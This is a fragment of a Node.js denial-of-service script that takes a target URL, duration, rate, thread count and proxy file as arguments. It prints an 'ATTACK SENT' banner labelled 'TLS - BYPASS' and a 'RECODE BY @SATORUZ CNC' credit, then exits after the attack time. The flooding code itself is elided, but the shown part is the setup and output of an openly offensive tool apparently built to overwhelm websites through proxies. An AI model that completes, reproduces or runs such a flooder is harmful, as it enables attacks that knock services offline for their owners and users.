...
const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;
    ...
    console.log(`TLS - BYPASS | ATTACK SENT`.gray)
    console.log(`-------------------------- `.rainbow)
    console.log(`- Target: ` .brightYellow + process.argv[2].white)
    console.log(`- Threads: `.brightYellow + process.argv[5].white)
    console.log(`- Proxyfile: `.brightYellow + process.argv[6].white)
    console.log(`- Time: `.brightYellow + process.argv[3].white)
    console.log(`- Rate: `.brightYellow + process.argv[4].white)
    console.log(`RECODE BY @SATORUZ CNC`.rainbow)
  setTimeout(() => {
    process.exit(1);
  }, process.argv[3] * 1000);
